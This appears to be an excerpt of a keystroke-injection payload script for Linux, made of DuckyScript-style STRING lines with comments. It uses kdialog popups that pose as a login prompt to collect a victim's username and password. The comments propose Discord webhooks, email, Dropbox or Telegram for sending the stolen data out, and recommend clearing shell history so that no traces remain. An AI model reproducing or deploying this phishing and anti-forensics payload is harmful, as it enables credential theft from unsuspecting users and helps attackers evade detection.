*  Requirements:
*      - EXFILTRATION:
*          - Internet Connection
*          - Discord webhook for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Dropbox, Telegram and so on..)
*      - PHISHING:
*          - This payload is usable on the Linux system where is installed 'kdialog', but you can use whatever you want for simulate the popup with the intent to take the input
*          - It is important that the popup payload occurs in a single line so that the traces of data collection are eliminated immediately after submission. This is precisely why you can see the * ed code to get a good understanding of what it is all about.

*  You can set the title, the message, the input type and so and so on...
STRING kdialog --title "Popup Title" --msgbox "Insert your username and password for go on"; 
STRING kdialog --title "Insert your Username" --inputbox "Username"; 
STRING kdialog --title "Insert your Password" --password "Password" --default "password";

*  history -c will clear the last shell history and the exit command will close the popup at the end of the execution
